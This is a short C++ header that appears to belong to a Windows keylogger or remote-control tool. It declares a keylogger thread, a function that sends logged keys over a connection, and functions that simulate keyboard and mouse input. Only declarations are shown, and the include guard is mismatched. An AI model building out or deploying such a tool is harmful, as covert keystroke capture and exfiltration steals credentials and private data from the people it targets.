#ifndef KEYSCAN_HPP
#define KEYSCAN_HPP_

#include "connect.cpp"
#include "keylogger.cpp"
#include "events.cpp"

#define MAX_BUFFER 4079

int SimulateKbtEventType(char *data);
int SimulateKbtEventTypeMod(char *data);
int SimulateMouseEventMove(char *action);
int SimulateMouseEventClick(int rol);
bool SendLoggedKeys(int fd);
DWORD WINAPI KeyloggerThread(LPVOID lpParameter);

#endif /*KEYSCAN_HPP_*/
